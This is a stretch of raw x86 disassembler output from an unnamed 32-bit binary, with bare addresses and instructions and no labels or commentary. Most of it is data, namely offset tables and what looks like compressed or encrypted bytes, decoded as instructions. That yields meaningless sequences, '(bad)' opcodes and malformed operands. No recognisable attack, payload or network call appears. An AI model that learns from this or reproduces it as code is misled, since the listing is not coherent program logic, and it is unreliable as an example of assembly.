  416263:	ds loope 0x4162a5
  416266:	jmp    0x4162a7
  416268:	clc    
  416269:	aas    
  41626a:	add    BYTE PTR [eax+0x0],ah
  41626d:	add    BYTE PTR [eax+0x0],bh
  416270:	add    BYTE PTR [eax],al
  416272:	add    al,0x30
  416274:	or     dh,BYTE PTR [eax]
  416276:	adc    dh,BYTE PTR [eax]
  416278:	sbb    BYTE PTR [eax],dh
  41627a:	xor    DWORD PTR [eax],esi
  41627c:	inc    edx
  41627d:	xor    BYTE PTR [edi+0x30],cl
  416280:	pusha  
  416281:	xor    BYTE PTR [esi+0x30],ah
  416284:	ins    BYTE PTR es:[edi],dx
  416285:	xor    BYTE PTR [ecx+0x30],bh
  416288:	mov    dh,BYTE PTR [eax]
  41628a:	lahf   
  41628b:	xor    BYTE PTR [edx-0x32cf41d0],dh
  416291:	xor    dl,ah
  416293:	xor    bh,ch
  416295:	xor    ah,bh
  416297:	xor    BYTE PTR [edi],al
  416299:	xor    DWORD PTR [ebx],ecx
  41629b:	xor    DWORD PTR [ebx],edx
  41629d:	xor    DWORD PTR [edi],edx
  41629f:	xor    DWORD PTR [ebx],esp
  4162a1:	xor    DWORD PTR [edi],ebp
  4162a3:	xor    DWORD PTR [ebx],esi
  4162a5:	xor    DWORD PTR [edx],edi
  4162a7:	xor    DWORD PTR [ebx+0x31],eax
  4162aa:	dec    ecx
  4162ab:	xor    DWORD PTR [edi+0x31],ecx
  4162ae:	pusha  
  4162af:	xor    DWORD PTR [ecx+esi*1+0x72],ebp
  4162b3:	xor    DWORD PTR [ecx-0x72ce78cf],eax
  4162b9:	xor    DWORD PTR [ebx-0x55ce5ecf],ebx
  4162bf:	xor    DWORD PTR [ecx+esi*1+0x32ee31b8],esi
  4162c6:	repnz xor bh,cl
  4162c9:	xor    bh,ch
  4162cb:	xor    al,BYTE PTR [esi]
  4162cd:	xor    ecx,DWORD PTR [edx]
  4162cf:	xor    edi,DWORD PTR [eax+0x35]
  4162d2:	jl     0x416309
  4162d4:	dec    edx
  4162d5:	cmp    eax,0x3e883d54
  4162da:	nop
  4162db:	ds cwde 
  4162dd:	fstp   TBYTE PTR ds:[edi]
  4162e0:	add    BYTE PTR [eax],al
  4162e2:	add    BYTE PTR [eax+0x0],dh
  4162e5:	add    BYTE PTR [eax+eax*1+0x0],ch
  4162e9:	add    BYTE PTR ds:0x7d327331,ch
  4162ef:	xor    al,BYTE PTR [edx+esi*1+0x3296328a]
  4162f6:	pushf  
  4162f7:	xor    ah,BYTE PTR [edx-0x42cd50ce]
  4162fd:	xor    cl,dl
  4162ff:	xor    al,BYTE PTR [ebp+esi*1+0x5d]
  416303:	xor    eax,0x3589356a
  416308:	xchg   ebp,eax
  416309:	xor    eax,0x35a2359c
  41630e:	scas   al,BYTE PTR es:[edi]
  41630f:	xor    eax,0x35ba35b4
  416314:	int3   
  416315:	xor    eax,0x370f35d0
  41631a:	sbb    esi,DWORD PTR [edi]
  41631c:	daa    
  41631d:	aaa    
  41631e:	sub    esi,DWORD PTR [edi]
  416320:	xor    esi,DWORD PTR [edi]
  416322:	jbe    0x41635c
  416324:	xchg   BYTE PTR [eax],bh
  416326:	cwde   
  416327:	cmp    BYTE PTR [esi-0x4ac754c8],bl
  41632d:	cmp    BYTE PTR [eax+edi*1+0x38d638c2],bh
  416334:	in     al,dx
  416335:	cmp    dl,dh
  416337:	cmp    BYTE PTR [edi],al
  416339:	cmp    DWORD PTR [ecx+edi*1],ecx
  41633c:	push   ecx
  41633d:	cmp    bl,BYTE PTR [ebx+0x3a]
  416340:	push   0x813a7b3a
  416345:	cmp    cl,BYTE PTR [esi-0x62c56ac6]
  41634b:	cmp    ah,BYTE PTR [edx+edi*1+0x8000]
  416352:	sbb    BYTE PTR [edx],al
  416354:	add    BYTE PTR [eax],al
  416356:	mov    dh,0x30
  416358:	mov    esp,0xcb30c230
  41635d:	xor    dl,dl
  41635f:	xor    ah,ch
  416361:	xor    al,bh
  416363:	xor    BYTE PTR [edx],al
  416365:	xor    DWORD PTR [ecx],ecx
  416367:	xor    DWORD PTR [edi],ecx
  416369:	xor    DWORD PTR [ebx],ebx
  41636b:	xor    DWORD PTR [ecx],esp
  41636d:	xor    DWORD PTR [edi],esp
  41636f:	xor    esp,ebp
  416371:	xor    esi,edi
  416373:	xor    DWORD PTR [eax],ecx
  416375:	xor    dl,BYTE PTR ds:0x2b322532
  41637b:	xor    bh,BYTE PTR [eax]
  41637d:	xor    bh,BYTE PTR [edi]
  41637f:	xor    al,BYTE PTR [ebp+0x32]
  416382:	dec    esp
  416383:	xor    bl,BYTE PTR [esi+0x33]
  416386:	xor    ebp,DWORD PTR fs:[esi+0x33]
  41638a:	je     0x4163bf
  41638c:	js     0x4163c1
  41638e:	xor    BYTE PTR [ebx],0x90
  416391:	xor    edx,DWORD PTR [ebx+esi*1+0x33a533a1]
  416398:	lods   al,BYTE PTR ds:[esi]
  416399:	xor    edi,DWORD PTR [ebx-0x37cc3dcd]
  41639f:	xor    edx,ebp
  4163a1:	xor    esp,edi
  4163a3:	xor    ebp,ebp
  4163a5:	xor    edi,edx
  4163a7:	xor    eax,DWORD PTR [ecx]
  4163a9:	xor    al,0xc
  4163ab:	xor    al,0x1b
  4163ad:	xor    al,0x25
  4163af:	xor    al,0x2a
  4163b1:	xor    al,0x30
  4163b3:	xor    al,0x36
  4163b5:	xor    al,0x48
  4163b7:	xor    al,0x57
  4163b9:	xor    al,0x66
  4163bb:	xor    al,0x75
  4163bd:	xor    al,0x84
  4163bf:	xor    al,0x88
  4163c1:	xor    al,0x98
  4163c3:	xor    al,0xc7
  4163c5:	xor    al,0xd0
  4163c7:	xor    al,0xdc
  4163c9:	xor    al,0xe6
  4163cb:	xor    al,0xf3
  4163cd:	xor    al,0x5
  4163cf:	xor    eax,0x3517350b
  4163d4:	sbb    eax,0x2b352535
  4163d9:	xor    eax,0x353b3536
  4163de:	inc    ecx
  4163df:	xor    eax,0x35573550
  4163e4:	pop    ebp
  4163e5:	xor    eax,0x3586356a
  4163ea:	xchg   edx,eax
  4163eb:	xor    eax,0x359e3598
  4163f0:	scas   al,BYTE PTR es:[edi]
  4163f1:	xor    eax,0x35c735bb
  4163f6:	into   
  4163f7:	xor    eax,0x35e735d4
  4163fc:	in     eax,dx
  4163fd:	xor    eax,0x360035f3
  416402:	or     al,0x36
  416404:	adc    esi,DWORD PTR [esi]
  416406:	sbb    DWORD PTR [esi],esi
  416408:	sub    esi,DWORD PTR [esi]
  41640a:	xor    DWORD PTR [esi],esi
  41640c:	ds ss inc ebp
  41640f:	ss dec ebx
  416411:	ss pop eax
  416413:	ss fs ss push 0x36
  416418:	jo     0x416450
  41641a:	jnp    0x416452
  41641c:	xchg   DWORD PTR [esi],esi
  41641e:	mov    esi,DWORD PTR [esi]
  416420:	xchg   edx,eax
  416421:	ss pushf 
  416423:	ss test eax,0xcb36c536
  416429:	fdiv   DWORD PTR ss:[esi]
  41642c:	fbstp  TBYTE PTR [esi]
  41642e:	in     eax,0x36
  416430:	in     al,dx
  416431:	div    DWORD PTR ss:[esi]
  416434:	add    DWORD PTR [edi],esi
  416436:	or     BYTE PTR [edi],dh
  416438:	push   cs
  416439:	aaa    
  41643a:	and    eax,0x38372b37
  41643f:	aaa    
  416440:	aas    
  416441:	aaa    
  416442:	inc    ebp
  416443:	aaa    
  416444:	push   edi
  416445:	aaa    
  416446:	pop    ebx
  416447:	aaa    
  416448:	data16 aaa 
  41644a:	imul   esi,DWORD PTR [edi],0x76
  41644d:	aaa    
  41644e:	xor    DWORD PTR [edi],0xffffffa7
  416451:	aaa    
  416452:	mov    cl,0x37
  416454:	mov    ebx,0xc837c237
  416459:	aaa    
  41645a:	aam    0x37
  41645c:	out    0x37,eax
  41645e:	in     eax,dx
  41645f:	aaa    
  416460:	stc    
  416461:	aaa    
  416462:	or     BYTE PTR [eax],bh
  416464:	push   cs
  416465:	cmp    BYTE PTR [eax+edi*1],dl
  416468:	sbb    DWORD PTR [eax],edi
  41646a:	and    bh,BYTE PTR [eax]
  41646c:	sub    al,0x38
  41646e:	xor    bh,BYTE PTR [eax]
  416470:	cmp    BYTE PTR ss:[esi],bh
  416473:	cmp    BYTE PTR [edx+0x38],cl
  416476:	data16 cmp BYTE PTR [eax+edi*1+0x7c],ch
  41647b:	cmp    BYTE PTR [edx-0x6cc773c8],al
  416481:	cmp    BYTE PTR [ecx-0x48c74ec8],bl
  416487:	cmp    ah,al
  416489:	cmp    dh,cl
  41648b:	cmp    bl,bl
  41648d:	cmp    bl,ch
  41648f:	cmp    cl,dh
  416491:	cmp    BYTE PTR [eax],al
  416493:	cmp    DWORD PTR [edi],eax
  416495:	cmp    DWORD PTR ds:0x1f391439,ecx
  41649b:	cmp    DWORD PTR [eax],esi
  41649d:	cmp    DWORD PTR [edi],esi
  41649f:	cmp    DWORD PTR ds:0x5a394a39,edi
  4164a5:	cmp    DWORD PTR [eax+0x39],esp
  4164a8:	outs   dx,DWORD PTR ds:[esi]
  4164a9:	cmp    DWORD PTR [esi+0x39],esi
  4164ac:	cmp    DWORD PTR [ecx],0x39ab3990
  4164b2:	mov    bl,0x39
  4164b4:	sar    BYTE PTR [ecx],0xd1
  4164b7:	cmp    edi,edx
  4164b9:	cmp    ebp,ebx
  4164bb:	cmp    edx,ebp
  4164bd:	cmp    DWORD PTR [ecx],ecx
  4164bf:	cmp    cl,BYTE PTR [edi]
  4164c1:	cmp    bl,BYTE PTR [ebx]
  4164c3:	cmp    ah,BYTE PTR [ecx]
  4164c5:	cmp    ch,BYTE PTR [ebx]
  4164c7:	cmp    dh,BYTE PTR [ecx]
  4164c9:	cmp    al,BYTE PTR [ebx+0x3a]
  4164cc:	dec    ebx
  4164cd:	cmp    dl,BYTE PTR [ebp+0x3a]
  4164d0:	bound  edi,QWORD PTR [edx]
  4164d2:	jle    0x41650e
  4164d4:	test   BYTE PTR [edx],bh
  4164d6:	xchg   ebx,eax
  4164d7:	cmp    bl,BYTE PTR [edx-0x56c55dc6]
  4164dd:	cmp    dh,BYTE PTR [edx+edi*1+0x3aca3ac3]
  4164e4:	sar    BYTE PTR [edx],1
  4164e6:	fnstsw WORD PTR [edx]
  4164e8:	out    dx,eax
  4164e9:	cmp    bh,bl
  4164eb:	cmp    al,BYTE PTR [ecx]
  4164ed:	cmp    ecx,DWORD PTR [ecx]
  4164ef:	cmp    edi,DWORD PTR [ebx]
  4164f1:	cmp    eax,DWORD PTR [ebp+0x3b]
  4164f4:	dec    esp
  4164f5:	cmp    edx,DWORD PTR [edx+0x3b]
  4164f8:	pop    esi
  4164f9:	cmp    esp,DWORD PTR [ebx+edi*1+0x6a]
  4164fd:	cmp    esi,DWORD PTR [edi+0x3b]
  416500:	jle    0x41653d
  416502:	test   BYTE PTR [ebx],bh
  416504:	xchg   ecx,eax
  416505:	cmp    ebx,DWORD PTR [ecx-0x4ac45dc5]
  41650b:	cmp    edi,DWORD PTR [ebp-0x26c435c5]
  416511:	cmp    ebx,edi
  416513:	cmp    ebp,edi
  416515:	cmp    edi,ecx
  416517:	cmp    eax,DWORD PTR [eax]
  416519:	cmp    al,0x6
  41651b:	cmp    al,0x21
  41651d:	cmp    al,0x2c
  41651f:	cmp    al,0x32
  416521:	cmp    al,0x38
  416523:	cmp    al,0x45
  416525:	cmp    al,0x4c
  416527:	cmp    al,0x52
  416529:	cmp    al,0x69
  41652b:	cmp    al,0x75
  41652d:	cmp    al,0x86
  41652f:	cmp    al,0x8c
  416531:	cmp    al,0x91
  416533:	cmp    al,0x9d
  416535:	cmp    al,0xa1
  416537:	cmp    al,0xa9
  416539:	cmp    al,0xad
  41653b:	cmp    al,0xb5
  41653d:	cmp    al,0xcb
  41653f:	cmp    al,0xd8
  416541:	cmp    al,0xe0
  416543:	cmp    al,0xed
  416545:	cmp    al,0xf3
  416547:	cmp    al,0x2
  416549:	cmp    eax,0x3d153d0a
  41654e:	sbb    DWORD PTR ds:0x3d2d3d23,edi
  416554:	cmp    bh,BYTE PTR ds:0x3d653d5f
  41655a:	jno    0x416599
  41655c:	ja     0x41659b
  41655e:	jg     0x41659d
  416560:	test   DWORD PTR ds:0x3d8f,edi
  416566:	add    BYTE PTR [eax+0xb00000],dl
  41656c:	add    BYTE PTR [eax],al
  41656e:	cmp    al,0x30
  416570:	xchg   ecx,eax
  416571:	xor    al,dl
  416573:	xor    al,bl
  416575:	xor    ch,bl
  416577:	xor    BYTE PTR [ebx],cl
  416579:	xor    DWORD PTR [ecx+esi*1],ebx
  41657c:	xor    DWORD PTR es:[esi],ebp
  41657f:	xor    DWORD PTR [esi],edi
  416581:	xor    DWORD PTR [ecx+0x31],ebp
  416584:	jne    0x4165b7
  416586:	nop
  416587:	xor    DWORD PTR [edx+0x2931b531],ebx
  41658d:	xor    ch,BYTE PTR [esi]
  41658f:	xor    dh,BYTE PTR [edi+0x32]
  416592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416593:	xor    dh,BYTE PTR [eax-0x41cd4bce]
  416599:	xor    cl,al
  41659b:	xor    cl,bh
  41659d:	xor    dl,ch
  41659f:	xor    ah,ah
  4165a1:	xor    ch,bh
  4165a3:	xor    dh,ch
  4165a5:	xor    al,BYTE PTR [edx]
  4165a7:	xor    ecx,DWORD PTR [ecx]
  4165a9:	xor    ecx,DWORD PTR [edi]
  4165ab:	xor    ebx,DWORD PTR [ecx-0x4bcb59cc]
  4165b1:	xor    al,0xc0
  4165b3:	xor    al,0xe1
  4165b5:	xor    al,0xeb
  4165b7:	xor    al,0xf2
  4165b9:	xor    al,0xf8
  4165bb:	xor    al,0x7
  4165bd:	xor    eax,0x3511350c
  4165c2:	pop    ss
  4165c3:	xor    eax,0x352a351d
  4165c8:	ss xor eax,0x354c3545
  4165ce:	push   edx
  4165cf:	xor    eax,0x356b355f
  4165d4:	jl     0x41660b
  4165d6:	xchg   ebp,eax
  4165d7:	xor    eax,0x35b135a2
  4165dc:	(bad)  
  4165dd:	xor    eax,0x35d835d4
  4165e2:	cmp    BYTE PTR [edi],dh
  4165e4:	inc    esp
  4165e5:	aaa    
  4165e6:	push   esp
  4165e7:	aaa    
  4165e8:	pop    edi
  4165e9:	aaa    
  4165ea:	push   0x74376e37
  4165ef:	aaa    
  4165f0:	xor    DWORD PTR [edi],0x37933787
  4165f6:	cdq    
  4165f7:	aaa    
  4165f8:	lahf   
  4165f9:	aaa    
  4165fa:	xor    bh,BYTE PTR [ebx]
  4165fc:	test   al,0x3c
  4165fe:	lods   al,BYTE PTR ds:[esi]
  4165ff:	cmp    al,0x23
  416601:	xor    edi,DWORD PTR ds:[esi]
  416604:	aas    
  416605:	ds dec esp
  416607:	ds push esp
  416609:	ds fs outs dx,BYTE PTR ds:[esi]
  41660d:	ds jnp 0x41664e
  416610:	sahf   
  416611:	mov    ds:0x3ea93e,eax
  416617:	rol    BYTE PTR [eax],1
  416619:	add    BYTE PTR [eax],bl
  41661b:	add    BYTE PTR [eax],al
  41661d:	add    BYTE PTR [edi],bl
  41661f:	cmp    ah,BYTE PTR [ebx]
  416621:	cmp    ah,BYTE PTR [edi]
  416623:	cmp    ch,BYTE PTR [ebx]
  416625:	cmp    ch,BYTE PTR [edi]
  416627:	cmp    dh,BYTE PTR [ebx]
  416629:	cmp    dh,BYTE PTR [edi]
  41662b:	cmp    bh,BYTE PTR [ebx]
  41662d:	cmp    al,BYTE PTR [eax]
  41662f:	add    BYTE PTR [ecx],al
  416631:	add    BYTE PTR [eax],bl
  416633:	add    BYTE PTR [eax],al
  416635:	add    BYTE PTR [edx+0x38],ah
  416638:	data16 cmp BYTE PTR [edx+0x38],ch
  41663c:	outs   dx,BYTE PTR ds:[esi]
  41663d:	cmp    BYTE PTR [edx+0x38],dh
  416640:	jbe    0x41667a
  416642:	jp     0x41667c
  416644:	jle    0x41667e
  416646:	add    al,al
  416648:	add    eax,DWORD PTR [eax]
  41664a:	push   0x18000000
  41664f:	xor    BYTE PTR [eax+esi*1],bl
  416652:	and    BYTE PTR [eax],dh
  416654:	mov    al,ds:0xa831a431
  416659:	xor    DWORD PTR [ecx+esi*1+0x31b431b0],ebp
  416660:	mov    eax,0xc031bc31
  416665:	xor    esp,eax
  416667:	xor    eax,edx
  416669:	xor    esp,edx
  41666b:	xor    eax,ebx
  41666d:	xor    esp,ebx
  41666f:	xor    eax,esp
  416671:	xor    esp,esp
  416673:	xor    eax,ebp
  416675:	xor    esp,ebp
  416677:	xor    eax,esi
  416679:	xor    esp,esi
  41667b:	xor    DWORD PTR [eax],eax
  41667d:	xor    cl,BYTE PTR [edx+esi*1]
  416680:	adc    al,0x32
  416682:	sub    BYTE PTR [edx],dh
  416684:	pop    esp
  416685:	xor    ah,BYTE PTR [eax+0x32]
  416688:	je     0x4166bc
  41668a:	lods   al,BYTE PTR ds:[esi]
  41668b:	xor    cl,BYTE PTR [eax+0x33]
  41668e:	sbb    BYTE PTR [eax+eiz*1],dh
  416691:	xor    al,0x28
  416693:	xor    al,0x2c
  416695:	xor    al,0xec
  416697:	cmp    al,dh
  416699:	cmp    ah,dh
  41669b:	cmp    al,bh
  41669d:	cmp    ah,bh
  41669f:	cmp    BYTE PTR [eax],al
  4166a1:	cmp    DWORD PTR [ecx+edi*1],eax
  4166a4:	or     BYTE PTR [ecx],bh
  4166a6:	or     al,0x39
  4166a8:	adc    BYTE PTR [ecx],bh
  4166aa:	adc    al,0x39
  4166ac:	add    BYTE PTR [eax],al
  4166ae:	add    al,dh
  4166b0:	add    eax,DWORD PTR [eax]
  4166b2:	sbb    BYTE PTR [eax],al
  4166b4:	add    BYTE PTR [eax],al
  4166b6:	add    al,0x3c
  4166b8:	or     BYTE PTR [esp+ecx*1],bh
  4166bb:	cmp    al,0x10
  4166bd:	cmp    al,0x14
  4166bf:	cmp    al,0x18
  4166c1:	cmp    al,0x1c
  4166c3:	cmp    al,0x20
  4166c5:	cmp    al,0x0
  4166c7:	and    BYTE PTR [eax+eax*1],al
  4166ca:	sbb    BYTE PTR [eax],al
  4166cc:	add    BYTE PTR [eax],al
  4166ce:	les    esi,FWORD PTR [edi]
  4166d0:	enter  0xcc37,0x37
  4166d4:	shl    BYTE PTR [edi],1
  4166d6:	aam    0x37
  4166d8:	fdiv   DWORD PTR [edi]
  4166da:	fdiv   QWORD PTR [edi]
  4166dc:	loopne 0x416715
	...
  4166e6:	in     eax,dx
  4166e7:	jle    0x4166db
  4166e9:	ret    
  4166ea:	repz iret 
  4166ec:	std    
  4166ed:	jle    0x4166ce
  4166ef:	loope  0x416733
  4166f1:	mov    al,0x61
  4166f3:	xor    ebx,edi
  4166f5:	ins    DWORD PTR es:[edi],dx
  4166f6:	in     eax,0x61
  4166f8:	add    DWORD PTR [eax],eax
  4166fa:	and    al,BYTE PTR [edi]
  4166fc:	add    BYTE PTR [eax],al
  4166fe:	add    ebx,DWORD PTR [esi-0x57f6e641]
  416704:	mov    eax,0x4afff5bf
  416709:	push   ebx
  41670a:	push   cs
  41670b:	push   ebx
  41670c:	pop    esp
  41670d:	das    
  41670e:	and    DWORD PTR [ecx-0x1ca08843],esi
  416714:	or     eax,0x73b139b9
  416719:	fild   WORD PTR [edi]
  41671b:	pop    esp
  41671c:	jno    0x416792
  41671e:	enter  0xc5ae,0x22
  416722:	or     BYTE PTR [ebx-0x1dcd6b5c],0xba
  416729:	aas    
  41672a:	shr    esp,cl
  41672c:	mov    bl,0x7a
  41672e:	cmp    BYTE PTR [esi+0x77],cl
  416731:	mov    bh,0xb9
  416733:	cmp    DWORD PTR [edi],esi
  416735:	add    ecx,ecx
  416737:	sbb    ah,BYTE PTR [edi-0x39]
  41673a:	jmp    0x416727
  41673c:	or     ah,BYTE PTR [eax+0x2d]
  41673f:	enter  0xaa06,0x70
  416743:	cmp    esp,DWORD PTR [edi]
  416745:	adc    al,0x6f
  416747:	adc    DWORD PTR ds:0xbe79bf98,esi
  41674d:	jae    0x416770
  41674f:	pop    es
  416750:	test   eax,0x1efb282d
  416755:	push   ebx
  416756:	xchg   BYTE PTR [ecx+edi*4-0x3c],ah
  41675a:	std    
  41675b:	mov    al,0xf1
  41675d:	mov    ?,WORD PTR [eax+0x53]
  416760:	jmp    0x416707
  416762:	add    bl,BYTE PTR [ebx]
  416764:	inc    eax
  416765:	jnp    0x416752
  416767:	or     bl,al
  416769:	push   ecx
  41676a:	mov    ebx,0x921f5460
  41676f:	cmc    
  416770:	or     DWORD PTR [edx+0x5],esi
  416773:	xchg   ecx,eax
  416774:	(bad)  
  416775:	mov    ah,0x71
  416777:	es pop ds
  416779:	push   esi
  41677a:	inc    ebp
  41677b:	dec    edx
  41677c:	cdq    
  41677d:	lods   al,BYTE PTR ds:[esi]
  41677e:	inc    eax
  41677f:	xchg   edi,eax
  416780:	fwait
  416781:	mov    esp,0xef3aced3
  416786:	sub    ch,BYTE PTR [ebx+0x27]
  416789:	outs   dx,DWORD PTR ds:[esi]
  41678a:	sbb    DWORD PTR [ebx],0xffffffb5
  41678d:	aaa    
  41678e:	(bad)  
  41678f:	in     eax,dx
  416790:	shr    DWORD PTR [edi],cl
  416792:	pop    eax
  416793:	imul   edx,DWORD PTR [ecx-0x1786e2f6],0xffffff8d
  41679a:	and    edx,DWORD PTR [edx-0x20cd096b]
  4167a0:	rcr    ah,1
  4167a2:	iret   
  4167a3:	or     BYTE PTR [esi],ah
  4167a5:	mov    ebp,0x38f9e628
  4167aa:	mov    edx,ebp
  4167ac:	icebp  
  4167ad:	into   
  4167ae:	sti    
  4167af:	jnp    0x41682e
  4167b1:	xor    edx,DWORD PTR [eax-0x9]
  4167b4:	push   0xffffffa7
  4167b6:	dec    ebp
  4167b7:	mov    ebx,0xb5033abe
  4167bc:	dec    esi
  4167bd:	or     DWORD PTR [edx+0x28],0x50f5c743
  4167c4:	mov    ch,0xe9
  4167c6:	dec    edx
  4167c7:	mov    dl,0xbc
  4167c9:	mov    ch,0x53
  4167cb:	jg     0x4167c1
  4167cd:	pop    esi
  4167ce:	mov    edi,eax
  4167d0:	stc    
  4167d1:	and    al,0x6c
  4167d3:	scas   al,BYTE PTR es:[edi]
  4167d4:	or     eax,0x59d2c381
  4167d9:	daa    
  4167da:	jb     0x4167ef
  4167dc:	pop    ebx
  4167dd:	jle    0x41676a
  4167df:	imul   eax,DWORD PTR [edx],0xffffffbe
  4167e2:	(bad)  
  4167e3:	mov    eax,0xa7bc9f9c
  4167e8:	pop    edi
  4167e9:	arpl   bp,di
  4167eb:	adc    ah,BYTE PTR [eax-0x72]
  4167ee:	and    al,BYTE PTR ds:0x2fc32b49
  4167f4:	xchg   esi,eax
  4167f5:	faddp  st(4),st
  4167f7:	ja     0x4167df
  4167f9:	cdq    
  4167fa:	mov    ss,esi
  4167fc:	mov    esp,DWORD PTR [esi+0x4a0bc610]
  416802:	lods   al,BYTE PTR ds:[esi]
  416803:	ror    DWORD PTR [ecx],1
  416805:	gs xchg bl,ah
  416808:	int    0xd0
  41680a:	or     edi,esp
  41680c:	daa    
  41680d:	into   
  41680e:	icebp  
  41680f:	push   cs
  416810:	add    BYTE PTR [edi-0x15],ch
  416813:	jo     0x4167f3
  416815:	std    
  416816:	ds dec ecx
  416818:	je     0x416847
  41681a:	and    ebp,DWORD PTR [eax+0x50d4ab0f]
  416820:	ja     0x4167b0
  416822:	and    ah,bl
  416824:	sti    
  416825:	pop    edi
  416826:	test   ebp,edx
  416828:	shr    BYTE PTR [esi+0x40],1
  41682b:	cmp    BYTE PTR [esi+edi*4+0x7a],bl
  41682f:	pop    esi
  416830:	cmc    
  416831:	iret   
  416832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416833:	add    edi,DWORD PTR [ebp+0x1452dbe9]
  416839:	sub    eax,0xbe9ba599
  41683e:	pop    ss
  41683f:	jmp    0x1c8033e2
  416844:	adc    al,0x22
  416846:	leave  
  416847:	push   edi
  416848:	pushf  
  416849:	aad    0x92
  41684b:	adc    DWORD PTR [eax],ecx
  41684d:	aaa    
  41684e:	add    eax,0xe8aa3a06
  416853:	lds    esi,FWORD PTR [esi+esi*4+0x74]
  416857:	push   edx
  416858:	data16 add al,0xc5
  41685b:	push   edi
  41685c:	push   cs
  41685d:	out    0xdf,al
  41685f:	cwde   
  416860:	xchg   edi,eax
  416861:	sahf   
  416862:	test   eax,0x12f9e0f2
  416867:	pushf  
  416868:	sbb    edx,0x5921c98d
  41686e:	push   edx
  41686f:	test   BYTE PTR [ebx],ah
  416871:	and    BYTE PTR [ebx+esi*4],0x49
  416875:	cld    
  416876:	cmc    
  416877:	or     BYTE PTR [edx+0x18a77f1b],bl
  41687d:	sub    BYTE PTR [edx+edi*1+0x27],cl
  416881:	xchg   eax,ebx
  416883:	jne    0x416876
  416885:	cmc    
  416886:	std    
  416887:	inc    ebx
  416888:	scas   al,BYTE PTR es:[edi]
  416889:	inc    ebp
  41688a:	lea    esp,[edi-0x77]
  41688d:	add    esi,DWORD PTR [ecx+0x58]
  416890:	mov    ebx,0x8093adeb
  416895:	dec    esp
  416896:	jns    0x416845
  416898:	jg     0x416844
  41689a:	out    0x0,al
  41689c:	rol    bl,1
  41689e:	shl    BYTE PTR [edi-0x43],1
  4168a1:	sbb    edi,edi
  4168a3:	jae    0x416831
  4168a5:	cdq    
  4168a6:	call   0x9598e3ae
  4168ab:	adc    eax,0xda0e64c3
  4168b0:	stc    
  4168b1:	jno    0x4168f5
  4168b3:	xor    al,0x2a
  4168b5:	jb     0x41687a
  4168b7:	jne    0x4168e1
  4168b9:	jl     0x41690d
  4168bb:	mov    ds:0x48670624,eax
  4168c0:	add    DWORD PTR [eax-0x6521ae47],ebx
  4168c6:	jb     0x416862
  4168c8:	mov    dl,0x1
  4168ca:	lea    ebx,[eax+esi*1]
  4168cd:	xchg   ebx,eax
  4168ce:	ror    DWORD PTR [edx+0x4c0a544f],1
  4168d4:	rcl    DWORD PTR [eax],1
  4168d6:	lahf   
  4168d7:	add    DWORD PTR [ecx+0x6dade925],ecx
  4168dd:	and    edi,edi
  4168df:	and    BYTE PTR [edi-0xa],bh
  4168e2:	jp     0x416950
  4168e4:	ds icebp 
  4168e6:	hlt    
  4168e7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4168e9:	or     DWORD PTR [ecx-0x75f62cb],esi
  4168ef:	xor    cl,BYTE PTR [eax+0x19]
  4168f2:	ins    DWORD PTR es:[edi],dx
  4168f3:	jge    0x4168d3
  4168f5:	pop    ds
  4168f6:	enter  0x547a,0xf5
  4168fa:	sbb    eax,0x8d685560
  4168ff:	cmp    dh,BYTE PTR [edi+0x6c035d2e]
  416905:	or     esp,DWORD PTR [ebp+0x6e]
  416908:	and    esp,ebx
  41690a:	cmp    eax,0x436c7c44
  41690f:	push   ebx
  416910:	mov    eax,ds:0xc90d397c
  416915:	pcmpeqb mm2,QWORD PTR [edi-0x1e706cbd]
  41691c:	or     DWORD PTR [esi-0x3f],ebx
  41691f:	add    ah,cl
  416921:	adc    al,0x18
  416923:	and    al,0xd0
  416925:	jmp    0x96f6c858
  41692a:	inc    ecx
  41692b:	mov    ebp,0xaab62310
  416930:	pop    esp
  416931:	lods   al,BYTE PTR ds:[esi]
  416932:	dec    ebx
  416933:	mov    cl,0x9f
  416935:	add    ch,BYTE PTR [ecx+0xb]
  416938:	adc    ebx,esi
  41693a:	lds    edi,FWORD PTR [ecx]
  41693c:	jle    0x41697f
  41693e:	or     eax,0x6dccc72a
  416943:	jge    0x416985
  416945:	mov    ds:0xa9f2a72a,eax
  41694a:	cmc    
  41694b:	lods   eax,DWORD PTR ds:[esi]
  41694c:	pop    esi
  41694d:	inc    esi
  41694e:	pop    ebp
  41694f:	lahf   
  416950:	cmp    dh,BYTE PTR [edi]
  416952:	arpl   WORD PTR [ebp+ebp*8+0x50],cx
  416956:	push   ss
  416957:	cmp    ebx,DWORD PTR [edi-0x53]
  41695a:	adc    BYTE PTR fs:[edx],ch
  41695d:	mov    dl,0xd7
  416960:	neg    BYTE PTR [ebx-0x7c40b03c]
  416966:	call   0x9b1a:0xd122f74c
  41696d:	daa    
  41696e:	pop    ecx
  41696f:	sbb    ch,BYTE PTR [eax+0x73fc6e61]
  416975:	int    0x53
  416977:	mov    ?,ebx
  416979:	or     ah,BYTE PTR [esi-0xb]
  41697c:	add    eax,eax
  41697e:	fisttp DWORD PTR [ecx-0x4c686800]
  416984:	addr16 stc 
  416986:	pop    ebx
  416987:	mov    BYTE PTR [esi],ch
  416989:	push   ds
  41698a:	test   DWORD PTR [edx-0x2f41c920],ecx
  416990:	jb     0x41691f
  416992:	imul   esp,ecx,0xffffffff
  416995:	in     al,0x8d
  416997:	inc    eax
  416998:	(bad)
  41699b:	push   eax
  41699c:	mov    ch,0x7a
  41699e:	add    BYTE PTR [esi],0x8e
  4169a1:	aas    
  4169a2:	xor    BYTE PTR ds:[ebx-0x63c0fd0b],cl
  4169a9:	xchg   BYTE PTR [edi],dh
  4169ab:	and    ebp,esi
  4169ad:	xlat   BYTE PTR ds:[ebx]
  4169ae:	mov    esi,0x48d83dcc
  4169b3:	mov    ch,0xe6
  4169b5:	mov    DWORD PTR [edi-0xe],ebx
  4169b8:	cmp    al,0x22
  4169ba:	pop    ebx
  4169bb:	cmp    al,0x5e
  4169bd:	addr16 mov ecx,0xeb9ebd6d
  4169c3:	shl    ah,cl
  4169c5:	cmp    DWORD PTR [eax],ebp
  4169c7:	push   esp
  4169c8:	test   ebp,0xe5e203e2
  4169ce:	in     al,dx
  4169cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169d0:	dec    eax
  4169d1:	adc    ah,ch
  4169d3:	pop    ebx
  4169d4:	lahf   
  4169d5:	lea    ebx,[ebx-0x4]
